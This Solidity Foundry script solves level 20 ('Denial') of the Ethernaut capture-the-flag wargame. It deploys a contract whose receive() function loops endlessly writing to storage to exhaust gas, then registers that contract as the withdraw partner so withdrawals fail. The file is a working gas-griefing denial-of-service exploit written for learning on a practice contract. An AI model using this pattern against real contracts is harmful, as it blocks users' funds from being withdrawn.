// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Denial} from "src/20/Denial.sol";
import {DenialFactory} from "src/20/DenialFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";

contract DenialExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL20_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new DenialFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig{value: 0.001 ether}(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract
        Exploit exploit = new Exploit();

        Denial(instance).setWithdrawPartner(address(exploit));

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}

contract Exploit {
    uint256[] bigArray;
    // This will spend all remaining gas then revert
    receive() external payable {
        while (true) {
            bigArray.push(0);
        }
    }
}
